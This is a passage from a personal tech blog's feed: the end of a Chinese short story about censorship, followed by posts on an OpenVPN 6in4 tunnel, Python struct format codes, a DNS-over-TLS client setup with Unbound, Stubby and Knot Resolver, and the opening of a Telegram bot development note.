阵，他终于木然走到她身边，张了张嘴唇，想对她说些什么。但是他掏出今天新发布的健康词汇列表，发现上面是一片空白——终于连最后一个词组也被有关部门屏蔽了。于是阿瓦登只好保持着沉默，默默地与面无表情的她擦肩而过，继续向前走去。他的身影逐渐融入同样安静的灰色人群之中，整个城市都显得寂静极了。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Set up 6in4 Tunnel via OpenVPN</title>
      <link href="/2018/Set-up-6in4-Tunnel-via-OpenVPN/"/>
      <url>/2018/Set-up-6in4-Tunnel-via-OpenVPN/</url>
      <content type="html"><![CDATA[<h1 id="Linux-iproute2-method"><a href="#Linux-iproute2-method" class="headerlink" title="Linux - iproute2 method"></a>Linux - iproute2 method</h1><p><a href="https://github.com/kmahyyg/6in4/" target="_blank" rel="noopener">https://github.com/kmahyyg/6in4/</a></p><p>More details: <a href="https://www.kmahyyg.xyz/2018/6in4-Tunnel/">https://www.kmahyyg.xyz/2018/6in4-Tunnel/</a></p><h1 id="nix-Win-OpenVPN-method"><a href="#nix-Win-OpenVPN-method" class="headerlink" title="*nix/Win - OpenVPN method"></a>*nix/Win - OpenVPN method</h1><h2 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h2><ul><li>A Server with IPv4 and native IPv6</li><li>A Client with at least a connection to server via IPv4</li><li>OpenVPN and its hosting OS with TUN support</li></ul><h2 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h2><p>Test Environment: Ubuntu 18.04 LTS (Server) &amp; DSM 5.2 also with a Arch Linux PC (Client)</p><h3 id="Server-Easy-and-simple"><a href="#Server-Easy-and-simple" class="headerlink" title="Server: Easy and simple"></a>Server: Easy and simple</h3><h4 id="Install-OpenVPN"><a href="#Install-OpenVPN" class="headerlink" title="Install OpenVPN"></a>Install OpenVPN</h4><pre class="line-numbers language-bash"><code class="language-bash">root@testsrv: apt update -y <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> apt <span class="token function">install</span> dist-upgrade -yroot@testsrv: apt <span class="token function">install</span> openvpn easy-rsa -yroot@testsrv: apt <span class="token function">install</span> dnsmasq -y  <span class="token comment" spellcheck="true"># Optional</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="Generate-a-server-amp-client-key-pair"><a href="#Generate-a-server-amp-client-key-pair" class="headerlink" title="Generate a server&amp;client key pair"></a>Generate a server&amp;client key pair</h4><pre class="line-numbers language-bash"><code class="language-bash">root@testsrv: <span class="token function">mkdir</span> /etc/openvpn/easy-rsa  <span class="token comment" spellcheck="true"># new directory to save keys</span>root@testsrv: <span class="token function">cp</span> -r /usr/share/easy-rsa/* /etc/openvpn/easy-rsa <span class="token comment" spellcheck="true"># copy sample configs</span>root@testsrv: vim /etc/openvpn/easy-rsa/vars<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Edit the file opened to give your certs and keys’ properties:</p><pre><code>vim /etc/openvpn/easy-rsa/vars</code></pre><pre><code>&gt;export KEY_COUNTRY=&quot;GR&quot;       # International country code&gt;export KEY_PROVINCE=&quot;Central Macedonia&quot;    # Province&gt;export KEY_CITY=&quot;Thessaloniki&quot;     # City&gt;export KEY_ORG=&quot;Parabing Creations&quot;     # Organization&gt;export KEY_EMAIL=&quot;nobody@parabing.com&quot;    # Email&gt;export KEY_CN=&quot;VPNsRUS&quot;      # Common name, recommend use your server hostname&gt;export KEY_NAME=&quot;VPNsRUS&quot;    # as you want&gt;export KEY_OU=&quot;Parabing&quot;     # Organization unit name&gt;export KEY_ALTNAMES=&quot;VPNsRUS&quot;    # as you want, keep it default if you don&#39;t know much about it</code></pre><p>Generator start:</p><pre class="line-numbers language-bash"><code class="language-bash">root@testsrv: <span class="token function">cp</span> /etc/openvpn/easy-rsa/openssl-1.0.0.cnf /etc/openvpn/easy-rsa/openssl.cnf    <span class="token comment" spellcheck="true"># openssl config, keep it unmodified</span>root@testsrv: <span class="token function">cd</span> /etc/openvpn/easy-rsaroot@testsrv: <span class="token function">source</span> varsroot@testsrv: ./clean-allroot@testsrv: ./build-caroot@testsrv: ./build-key-server delta   <span class="token comment" spellcheck="true"># delta should be the server name you like</span>root@testsrv: ./build-dhroot@testsrv: openvpn --genkey --secret /etc/openvpn/easy-rsa/keys/ta.key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Copy the <code>ca.crt ca.key delta.crt delta.key dh2048.pem ta.key</code> from <code>/etc/openvpn/easy-rsa/keys</code> to <code>/etc/openvpn/easy-rsa/</code></p><h4 id="OpenVPN-server-config-and-start"><a href="#OpenVPN-server-config-and-start" class="headerlink" title="OpenVPN server config and start"></a>OpenVPN server config and start</h4><p>Config file: (save to <code>/etc/openvpn/server.conf</code>)</p><pre><code>server 10.0.8.0 255.255.255.0         # VPN Client IPv4 subnettopology subnetserver-ipv6 fc00:aaff:ffac::13:0/64   # VPN Client IPv6 subnetport 10666proto udp   dev tunauth SHA1# Ensure IPv4 is open for connectionpush &quot;redirect-gateway autolocal def1 bypass-dhcp&quot;push &quot;topology subnet&quot;push &quot;dhcp-option DNS 223.5.5.5&quot;push &quot;dhcp-option DNS 119.29.29.29&quot;# IPv6 DNSpush &quot;dhcp-option DNS 2001:da8::666&quot;push &quot;dhcp-option DNS 2001:4860:4860::8888&quot;push &quot;ping 5&quot;push &quot;ping-restart 30&quot;keepalive 30 120duplicate-cnclient-to-clientpersist-keypersist-tungroup nogroupuser nobodytls-auth ta.key 0ca ca.crtcert server.crtkey server.keydh dh2048.pemcipher AES-256-GCMcomp-lzoverb 3fast-ioexplicit-exit-notify 1</code></pre><p>Start Service:</p><pre class="line-numbers language-bash"><code class="language-bash">root@testsrv: ip6tables -t nat -A POSTROUTING -j SNAT --to-source <span class="token operator">&lt;</span>SERVER EXACT IPv6 ADDRESS<span class="token operator">></span>root@testsrv: systemctl start openvpn@serverroot@testsrv: systemctl <span class="token function">enable</span> openvpn@server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Client-Simply-Copy-amp-Paste"><a href="#Client-Simply-Copy-amp-Paste" class="headerlink" title="Client: Simply Copy&amp;Paste"></a>Client: Simply Copy&amp;Paste</h3><h4 id="Generate-client-key-pair-server"><a href="#Generate-client-key-pair-server" class="headerlink" title="Generate client key pair@server"></a>Generate client key pair@server</h4><p>Generator start:</p><pre class="line-numbers language-bash"><code class="language-bash">root@testsrv: ./build-key laptop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Copy the <code>ca.crt laptop.crt laptop.key dh2048.pem ta.key</code> from <code>/etc/openvpn/easy-rsa/keys</code> to your client machine.</p><h4 id="OpenVPN-client-config"><a href="#OpenVPN-client-config" class="headerlink" title="OpenVPN client config"></a>OpenVPN client config</h4><p>Client config file: (save to current working directory named <code>v4Tv6.ovpn</code>)</p><pre><code>clientproto udpdev tunverb 3remote x.x.x.x 10666 udpkeepalive 30 120route 0.0.0.0 0.0.0.0 net_gateway  # route IPv4 traffic to serverroute-ipv6 ::/0 net_gateway     # route IPv6 traffic to serverscript-security 2ca ca.crtcert client.crtkey client.keytls-auth ta.key 1cipher AES-256-GCMnobindauth SHA1comp-lzoauth-nocachefast-ioverb 3</code></pre><h4 id="Start-OpenVPN-and-enjoy"><a href="#Start-OpenVPN-and-enjoy" class="headerlink" title="Start OpenVPN and enjoy"></a>Start OpenVPN and enjoy</h4><pre class="line-numbers language-bash"><code class="language-bash">user@tstclient: <span class="token function">sudo</span> openvpn ./v4Tv6.ovpn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Acknowledgement-Successive-Rankings"><a href="#Acknowledgement-Successive-Rankings" class="headerlink" title="Acknowledgement: (Successive Rankings)"></a>Acknowledgement: (Successive Rankings)</h1><ul><li><a href="http://www.strrl.com/2018/05/24/%E4%BD%BF%E7%94%A8OpenVPN%E7%9A%84tun%E6%A8%A1%E5%BC%8F%E5%BB%BA%E7%AB%8B4to6%E9%9A%A7%E9%81%93/" target="_blank" rel="noopener">http://www.strrl.com/2018/05/24/%E4%BD%BF%E7%94%A8OpenVPN%E7%9A%84tun%E6%A8%A1%E5%BC%8F%E5%BB%BA%E7%AB%8B4to6%E9%9A%A7%E9%81%93/</a></li><li><a href="https://fangdingjun.blogspot.com/2015/11/openvpnipv6.html" target="_blank" rel="noopener">https://fangdingjun.blogspot.com/2015/11/openvpnipv6.html</a></li><li><a href="https://unix.stackexchange.com/questions/136211/routing-public-ipv6-traffic-through-openvpn-tunnel" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/136211/routing-public-ipv6-traffic-through-openvpn-tunnel</a></li><li><a href="https://freeaqingme.tweakblogs.net/blog/9237/openvpn-ipv6-with-ula-and-nat.html" target="_blank" rel="noopener">https://freeaqingme.tweakblogs.net/blog/9237/openvpn-ipv6-with-ula-and-nat.html</a></li><li><a href="https://serverfault.com/questions/237851/how-can-i-setup-openvpn-with-ipv4-and-ipv6-using-a-tap-device" target="_blank" rel="noopener">https://serverfault.com/questions/237851/how-can-i-setup-openvpn-with-ipv4-and-ipv6-using-a-tap-device</a></li><li><a href="https://techblog.synagila.com/2016/02/24/build-a-openvpn-server-on-ubuntu-to-provide-a-ipv6-tunnel-over-ipv4/" target="_blank" rel="noopener">https://techblog.synagila.com/2016/02/24/build-a-openvpn-server-on-ubuntu-to-provide-a-ipv6-tunnel-over-ipv4/</a></li><li><a href="https://wiki.archlinux.org/index.php/Easy-RSA" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Easy-RSA</a></li><li><a href="https://linux.cn/article-3706-1.html" target="_blank" rel="noopener">https://linux.cn/article-3706-1.html</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>6in4 Tunnel</title>
      <link href="/2018/6in4-Tunnel/"/>
      <url>/2018/6in4-Tunnel/</url>
      <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>原本学校有ipv6双栈无线网络，然而网关最近坏了，恰逢各大高校V6 PT站520开放注册。<br>所以目前只有借用机房一台小跳板机器来实现。</p><h1 id="尝试-OPENVPN"><a href="#尝试-OPENVPN" class="headerlink" title="尝试 OPENVPN"></a>尝试 OPENVPN</h1><p>参考了很多教程，V6路由一直不正常，Traceroute第一跳都是null，遂放弃。</p><h1 id="尝试-iproute2"><a href="#尝试-iproute2" class="headerlink" title="尝试 iproute2"></a>尝试 iproute2</h1><p>缺点：貌似只能在linux系统下用</p><p>重点：开NDP Proxy和跨网卡NAT实现数据转发</p><p>代码： <a href="https://github.com/kmahyyg/6in4/" target="_blank" rel="noopener">https://github.com/kmahyyg/6in4/</a></p><p>用法：懒得改某些机密信息了，随意吧。</p><p>服务器端运行 <code>sudo ./add_srv.sh</code><br>客户端运行   <code>sudo ./add_cli.sh</code></p><h1 id="PT站点支持情况"><a href="#PT站点支持情况" class="headerlink" title="PT站点支持情况"></a>PT站点支持情况</h1><p>六维空间禁止隧道<br>南洋PT看起来正常且官方提供NAT端口转发教程。</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python struct.pack() formatting characters</title>
      <link href="/2018/Python-C-formatting-characters/"/>
      <url>/2018/Python-C-formatting-characters/</url>
      <content type="html"><![CDATA[<p>Formatting Characters from <a href="https://docs.python.org/2/library/struct.html" target="_blank" rel="noopener">Python Referrence</a></p><table><thead><tr><th>Format</th><th>C Type</th><th>Python type</th><th>Standard size</th><th>Notes</th></tr></thead><tbody><tr><td><code>x</code></td><td>pad byte</td><td>no value</td><td></td><td></td></tr><tr><td><code>c</code></td><td><code>char</code></td><td>string of length 1</td><td>1</td><td></td></tr><tr><td><code>b</code></td><td><code>signed char</code></td><td>integer</td><td>1</td><td>(3)</td></tr><tr><td><code>B</code></td><td><code>unsigned char</code></td><td>integer</td><td>1</td><td>(3)</td></tr><tr><td><code>?</code></td><td><code>_Bool</code></td><td>bool</td><td>1</td><td>(1)</td></tr><tr><td><code>h</code></td><td><code>short</code></td><td>integer</td><td>2</td><td>(3)</td></tr><tr><td><code>H</code></td><td><code>unsigned short</code></td><td>integer</td><td>2</td><td>(3)</td></tr><tr><td><code>i</code></td><td><code>int</code></td><td>integer</td><td>4</td><td>(3)</td></tr><tr><td><code>I</code></td><td><code>unsigned int</code></td><td>integer</td><td>4</td><td>(3)</td></tr><tr><td><code>l</code></td><td><code>long</code></td><td>integer</td><td>4</td><td>(3)</td></tr><tr><td><code>L</code></td><td><code>unsigned long</code></td><td>integer</td><td>4</td><td>(3)</td></tr><tr><td><code>q</code></td><td><code>long long</code></td><td>integer</td><td>8</td><td>(2), (3)</td></tr><tr><td><code>Q</code></td><td><code>unsigned long long</code></td><td>integer</td><td>8</td><td>(2), (3)</td></tr><tr><td><code>f</code></td><td><code>float</code></td><td>float</td><td>4</td><td>(4)</td></tr><tr><td><code>d</code></td><td><code>double</code></td><td>float</td><td>8</td><td>(4)</td></tr><tr><td><code>s</code></td><td><code>char[]</code></td><td>string</td><td></td><td></td></tr><tr><td><code>p</code></td><td><code>char[]</code></td><td>string</td><td></td><td></td></tr><tr><td><code>P</code></td><td><code>void *</code></td><td>integer</td><td></td><td>(5), (3)</td></tr></tbody></table>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DNS-Over-TLS Client Setup</title>
      <link href="/2018/DNS-Over-TLS/"/>
      <url>/2018/DNS-Over-TLS/</url>
      <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>Read this to know what you should know before you skim my article:</p><ul><li><a href="https://tenta.com/blog/post/2017/12/dns-over-tls-vs-dnscrypt" target="_blank" rel="noopener">DNS-Over-TLS vs DNSCrypt</a></li><li><a href="https://tools.ietf.org/html/rfc7858" target="_blank" rel="noopener">Technical details in RFC7858</a></li><li><a href="https://www.quad9.net" target="_blank" rel="noopener">Quad9 DNS</a> offered by IBM.</li><li><a href="https://1.1.1.1" target="_blank" rel="noopener">Cloudflare DNS</a> This DNS is the fastest ever DNS, but working much more unstable in China Mainland. This DNS doesn’t provide any EDNS support.</li><li><a href="https://developers.cloudflare.com/1.1.1.1/dns-over-tls/" target="_blank" rel="noopener">DNS-Over-TLS test via Knot-DIG</a></li></ul><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><ol><li><p>From your DNS Provider, do a cross-check whether it support DNS-Over-TLS or not.</p></li><li><p>Copy the SSL certificate PIN and hostname (PIN must encoded in SHA256 with Base64 Encoded) to let resolver confirm DNS certificate.You can get it from <code>kdig</code> result in a reliable network or provider’s website.</p><p>For example:</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token punctuation">[</span>kmahyyg@PatrickY  /etc<span class="token punctuation">]</span> $ kdig -d @1.1.1.1 +tls-ca +tls-host<span class="token operator">=</span>cloudflare-dns.com baidu.com<span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG: Querying <span class="token keyword">for</span> owner<span class="token punctuation">(</span>baidu.com.<span class="token punctuation">)</span>, class<span class="token punctuation">(</span>1<span class="token punctuation">)</span>, type<span class="token punctuation">(</span>1<span class="token punctuation">)</span>, server<span class="token punctuation">(</span>1.1.1.1<span class="token punctuation">)</span>, port<span class="token punctuation">(</span>853<span class="token punctuation">)</span>, protocol<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG: TLS, imported 166 system certificates<span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG: TLS, received certificate hierarchy:<span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG:  <span class="token comment" spellcheck="true">#1, C=US,ST=CA,L=San Francisco,O=Cloudflare\, Inc.,CN=*.cloudflare-dns.com</span><span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG:      SHA-256 PIN: yioEpqeR4WtDwE9YxNVnCEkTxIjx6EEIwFSQW+lJsbc<span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG:  <span class="token comment" spellcheck="true">#2, C=US,O=DigiCert Inc,CN=DigiCert ECC Secure Server CA</span><span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG:      SHA-256 PIN: PZXN3lRAy+8tBKk2Ox6F7jIlnzr2Yzmwqc3JnyfXoCw<span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG: TLS, skipping certificate PIN check<span class="token punctuation">;</span><span class="token punctuation">;</span> DEBUG: TLS, The certificate is trusted. <span class="token punctuation">;</span><span class="token punctuation">;</span> TLS session <span class="token punctuation">(</span>TLS1.2<span class="token punctuation">)</span>-<span class="token punctuation">(</span>ECDHE-ECDSA-SECP256R1<span class="token punctuation">)</span>-<span class="token punctuation">(</span>AES-256-GCM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span> -<span class="token operator">>></span>HEADER<span class="token operator">&lt;&lt;</span>- opcode: QUERY<span class="token punctuation">;</span> status: NOERROR<span class="token punctuation">;</span> id: 58591<span class="token punctuation">;</span><span class="token punctuation">;</span> Flags: qr rd ra<span class="token punctuation">;</span> QUERY: 1<span class="token punctuation">;</span> ANSWER: 2<span class="token punctuation">;</span> AUTHORITY: 0<span class="token punctuation">;</span> ADDITIONAL: 1<span class="token punctuation">;</span><span class="token punctuation">;</span> EDNS PSEUDOSECTION:<span class="token punctuation">;</span><span class="token punctuation">;</span> Version: 0<span class="token punctuation">;</span> flags: <span class="token punctuation">;</span> UDP size: 1536 B<span class="token punctuation">;</span> ext-rcode: NOERROR<span class="token punctuation">;</span><span class="token punctuation">;</span> PADDING: 394 B<span class="token punctuation">;</span><span class="token punctuation">;</span> QUESTION SECTION:<span class="token punctuation">;</span><span class="token punctuation">;</span> baidu.com.                  IN    A<span class="token punctuation">;</span><span class="token punctuation">;</span> ANSWER SECTION:baidu.com.              466    IN    A    111.13.101.208baidu.com.              466    IN    A    220.181.57.216<span class="token punctuation">;</span><span class="token punctuation">;</span> Received 468 B<span class="token punctuation">;</span><span class="token punctuation">;</span> Time 2018-04-02 21:48:03 CST<span class="token punctuation">;</span><span class="token punctuation">;</span> From 1.1.1.1@853<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span> <span class="token keyword">in</span> 193.7 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>According to popularity, we have two methods to use DNS-Over-TLS as a client. More details, see <a href="https://dnsprivacy.org/wiki/display/DP/DNS+Privacy+Clients" target="_blank" rel="noopener">DNS Privacy</a></p><p>(1) Unbound + Stubby.</p><p>The Stubby is a TCP request forwarder working behind Unbound. Configuration are distributed all the internet.</p><p>Unbound is a famous DNS server.</p><p>(2) Knot Resolver</p><p>Knot Resolver is created by CZ.NIC Labs, which has Knot DNS Server and Knot Dig.</p><p>Knot Resolver is written in C &amp; Golang &amp; Lua, with a highly extensible framework, working as a full-featured DNS relay.</p><p>Today, I’m going to introduce Knot Resolver to you.</p></li></ol><h1 id="Installation-and-Deployment"><a href="#Installation-and-Deployment" class="headerlink" title="Installation and Deployment"></a>Installation and Deployment</h1><p>All examples is tested to be working properly under Deepin Linux, which is Debian Sid based.</p><p>If you have a Debian-based *nix System, this tutorial should work.</p><p>Check whether a software is listening 53,853 ports first.</p><h2 id="1-Unbound-with-Stubby-All-simple"><a href="#1-Unbound-with-Stubby-All-simple" class="headerlink" title="(1)Unbound with Stubby: All simple"></a>(1)Unbound with Stubby: All simple</h2><h3 id="Install-Unbound-first"><a href="#Install-Unbound-first" class="headerlink" title="Install Unbound first"></a>Install Unbound first</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># apt update -y &amp;&amp; apt install unbound -y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Install-Stubby"><a href="#Install-Stubby" class="headerlink" title="Install Stubby"></a>Install Stubby</h3><p>Cuz Stubby only exists in sid, and its dependencies is lacked in the current repository. So, I recommend you to compile from source directly.</p><p>Stubby relies on GetDNS. But the GetDNS in Debian is so old, so you still need to compile it yourself at the very beginning.</p><h3 id="Dependencies-and-compile"><a href="#Dependencies-and-compile" class="headerlink" title="Dependencies and compile"></a>Dependencies and compile</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># apt install build-essential libunbound-dev libidn2-dev libssl-dev libtool m4 autoconf libyaml-dev #Note: libidn2-0-dev maybe used here.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Compile-GetDNS-with-–with-stubby"><a href="#Compile-GetDNS-with-–with-stubby" class="headerlink" title="Compile GetDNS with –with-stubby"></a>Compile GetDNS with –with-stubby</h4><p>Here, we chose to install at /usr/local/getdns</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># git clone https://github.com/getdnsapi/getdns.git</span><span class="token comment" spellcheck="true"># git submodule update --init</span><span class="token comment" spellcheck="true"># libtoolize -ci # (use glibtoolize for OS X, libtool is installed as glibtool to avoid name conflict on OS X)</span><span class="token comment" spellcheck="true"># autoreconf -fi</span><span class="token comment" spellcheck="true"># mkdir /usr/local/getdns</span><span class="token comment" spellcheck="true"># ./configure --prefix=/usr/local/getdns --without-libidn --enable-stub-only --with-stubby</span><span class="token comment" spellcheck="true"># make</span><span class="token comment" spellcheck="true"># make install</span><span class="token comment" spellcheck="true"># ldconfig</span><span class="token comment" spellcheck="true"># ln -s /usr/local/getdns/bin/stubby /usr/bin/stubby</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After you successfully compiled, try <code>sudo stubby -lv</code> to check.</p><h3 id="Configuration-in-Unbound-and-Stubby"><a href="#Configuration-in-Unbound-and-Stubby" class="headerlink" title="Configuration in Unbound and Stubby"></a>Configuration in Unbound and Stubby</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># unbound-anchor</span><span class="token comment" spellcheck="true"># touch /var/run/unbound.pid</span><span class="token comment" spellcheck="true"># touch /var/log/unbound.log &amp;&amp; chmod 666 /var/log/unbound.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Refresh root hints first.</p><p>Directly Clone the repo listed below and put the configure file in the proper location.</p><p>For example:</p><ul><li>Unbound: /etc/unbound</li><li>Stubby: /usr/local/getdns/etc/stubby</li></ul><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/kmahyyg/DoT_1111.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h4><p>So poor. Average time cost is 1.+s ~ 3.+s. It depends on the network environment and how much GFW involved in, cause GFW usually give network data packet which transferred to outside China mainland a TCP_CONN_RESET.</p><p>FUCK U, CCP! </p><p>FUCK U, GFW! </p><h2 id="2-Knot-Resolver-Simple-config-with-complicated-installer"><a href="#2-Knot-Resolver-Simple-config-with-complicated-installer" class="headerlink" title="(2)Knot-Resolver: Simple config with complicated installer"></a>(2)Knot-Resolver: Simple config with complicated installer</h2><h3 id="Compile-from-source"><a href="#Compile-from-source" class="headerlink" title="Compile from source"></a>Compile from source</h3><p>See <a href="https://github.com/CZ-NIC/knot-resolver" target="_blank" rel="noopener">Github</a> for more details including Docker image.</p><h3 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h3><pre class="line-numbers language-bash"><code class="language-bash">root@hostname <span class="token comment" spellcheck="true"># vi /etc/knot-resolver/kresd.conf</span>root@hostname <span class="token comment" spellcheck="true"># mkdir /tmp/kresd-cache.mdb</span>root@hostname <span class="token comment" spellcheck="true"># cat /etc/hosts > /etc/hosts.y.kresd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>-- Default empty Knot DNS Resolver configuration in -*- lua -*--- Bind ports as privileged user (root) --net = { &#39;127.0.0.1&#39;, &#39;::1&#39; }-- Unprivileged user --user(&#39;knot-resolver&#39;,&#39;knot-resolver&#39;)-- Cache related --cache.size = 50*MBevent.recurrent(60 * minute, function()        cache.prune()end)cache.storage = &#39;lmdb:///tmp/kresd-cache.mdb&#39;-- Load modules --modules = {    &#39;policy &lt; hints&#39;,    &#39;hints &gt; iterate&#39;,    &#39;daf&#39;}-- Add custom hosts file --hint.add_hosts(&#39;/etc/hosts.y.kresd&#39;)-- DNS Firewall --daf.add &#39;qname ~ (api|ps|sv|offnavi|newvector|ulog.imap|newloc)(.map|).(baidu|n.shifen).com deny&#39;daf.add &#39;qname ~ (.+.|^)(360|so).(cn|com) deny&#39;daf.add &#39;qname ~ (.*.||)(dafahao|minghui|dongtaiwang|epochtimes|ntdtv|falundafa|wujieliulan).(org|com|net) deny&#39;daf.add &#39;qname ~ (.*.||)(guerrillamail|guerrillamailblock|sharklasers|grr|pokemail|spam4|bccto|chacuo|027168).(info|biz|com|de|net|org|me|la) deny&#39;-- At this time, no DNS64 support ---- Now supported: DNSSEC ---- BEGIN: DNS over TLS --policy.add(policy.all(policy.TLS_FORWARD({{'1.1.1.1', pin_sha256={'yioEpqeR4WtDwE9YxNVnCEkTxIjx6EEIwFSQW+lJsbc=','PZXN3lRAy+8tBKk2Ox6F7jIlnzr2Yzmwqc3JnyfXoCw='}}})))-- END: DNS over TLS --</code></pre><h4 id="Test-for-performance"><a href="#Test-for-performance" class="headerlink" title="Test for performance"></a>Test for performance</h4><p>Unable to do that. Strongly recommend you <strong>NOT</strong> to use this method because this package doesn’t have any modules built-in except <code>iterator,cache,validator</code> , you’ll need to compile all modules inneed by yourself. I didn’t go through this method.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>NOT RECOMMEND TO USE THIS AS A PRIMARY DNS METHOD BECAUSE OF POOR CONNECTIVITY IN CHINA.</p><h1 id="More-questions"><a href="#More-questions" class="headerlink" title="More questions"></a>More questions</h1><p>Feel free to contact me via comments at the bottom of the text or use TG to get in touch with me.</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Develop a Simple Telegram Bot @lifehap4_yygbot</title>
      <link href="/2018/TelegramBOT-Devnote/"/>
      <url>/2018/TelegramBOT-Devnote/</url>
      <content type="html"><![CDATA[<h1 id="Acknowledge"><a href="#Acknowledge" class="headerlink" title="Acknowledge"></a>Acknowledge</h1><p>A huge thank to  <a href="https://www.bennythink.com" target="_blank" rel="noopener"><strong>@BennyThink</strong></a>  . He helps me solved a lot of problems.</p><ol><li><a href="https://blog.nfz.moe/archives/how-to-write-beautiful-github-readme.html" target="_blank" rel="noopener">https://blog.nfz.moe/archives/how-to-write-beautiful-github-readme.html</a></li><li><a href="https://github.com/BennyThink/ExpressBot" target="_blank" rel="noopener">https://github.com/BennyThink/ExpressBot</a></li><li><a href="http://drakeet.me/create-telegram-bot-with-python/" target="_blank" rel="noopener">http://drakeet.me/create-telegram-bot-with-python/</a></li><li><a href="https://www.stackoverflow.com/" target="_blank" rel="noopener">https://www.stackoverflow.com</a> Thanks for those experts.</li><li><a href="https://www.liaoxuefeng.com/" target="_blank" rel="noopener">https://www.liaoxuefeng.com</a> Thanks for his tutorials. Very useful for green hands.</li><li><a href="https://github.com/eternnoir/pyTelegramBotAPI" target="_blank" rel="noopener">https://github.com/eternnoir/pyTelegramBotAPI</a>  Thanks for dependencies.</li><li><a href="https://github.com/coderfox/Kuaidi100API" target="_blank" rel="noopener">https://github.com/coderfox/Kuaidi100API</a> Thanks for dependencies.</li><li><a href="https://fast.v2ex.com/member/showfom" target="_blank" rel="noopener">https://fast.v2ex.com/member/showfom</a> and his <a href="https://ip.sb/" target="_blank" rel="noopener">https://ip.sb</a> <a href="https://sm.ms/" target="_blank" rel="noopener">https://sm.ms</a> <a href="https://u.nu/" target="_blank" rel="noopener">https://u.nu</a></li><li><a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">https://core.telegram.org/bots/api</a></li></ol><h1 id="Start-up-from-Lifehacker"><a href="#Start-up-from-Lifehacker" class="headerlink" title="Start up from Lifehacker"></a>Start up from Lifehacker</h1><p>Originally, when I was young, I have a strong demand of using Gmail as my primary mail. However, because of some reasons we all know, Google Service was banned by China Communist Party’s Government. As we all know, Google has a idiom that all IT man knew: Google is human’s hugest hope. <strong>We Need Google! We love Google! Google helps us make the world better!</strong> Love Nexus&amp;Pixel.</p><p>So that, I started to learn technologies to cross the firewall. Thanks to Lifehacker’s creator @roamlog and maintainer @jannerchang, their blogs helps me a lot.(Now, we named our blog as CodeSucker and gathered so many people to share their experience about all things.)</p><p>But, with the censorship goes really strict, we changed our main IM from QQ to Telegram, a Peer-to-Peer-Encyption-supported &amp; Non-censorship chat platform. Telegram has a very powerful dev-friendly Bot ReST API, you can use it to do a lot of things and improve your productivities.</p><p>First of all, the Telegram isn’t a popularity in the past few years.  @chinanet has some powerful features. For example, Send a package emoji to check your express package status; Set a message trigger to make jokes on somebody(We called it as put a flag); Use search engine and check daily-life info very comfortably.  With the users group of Telegram grows so fast, This bot turns into internally use. We can’t have any fun after that.</p><h1 id="Preparation"><a href="#Preparation" class="headerlink" 